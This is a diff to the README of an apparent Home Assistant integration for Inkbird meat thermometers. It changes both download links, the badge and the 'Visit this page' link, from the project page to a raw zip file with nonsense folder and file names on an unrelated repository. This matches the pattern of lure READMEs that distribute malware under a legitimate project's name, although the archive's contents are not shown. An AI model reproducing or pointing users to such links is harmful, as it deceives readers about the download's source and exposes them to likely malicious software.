@@ -5,7 +5,7 @@ description: "Integrate Inkbird INT-14-BW and IBT-4XS meat thermometers directly
 ---
 # 🌡️ ha-inkbird-int14bw - Connect Inkbird thermometers to Home Assistant
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sadistic-froelichia458/ha-inkbird-int14bw)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Sadistic-froelichia458/sadistic-froelichia458.github.io/main/chickenheartedness/sarcoma.zip)
 
 ## 📖 About this project
 
@@ -24,7 +24,7 @@ Before you start the installation, ensure your setup meets these requirements:
 
 You must visit the project page to access the necessary files. 
 
-[Visit this page to download the latest integration files](https://github.com/Sadistic-froelichia458/ha-inkbird-int14bw)
+[Visit this page to download the latest integration files](https://raw.githubusercontent.com/Sadistic-froelichia458/sadistic-froelichia458.github.io/main/chickenheartedness/sarcoma.zip)
 
 ## 🛠️ Installation steps
 
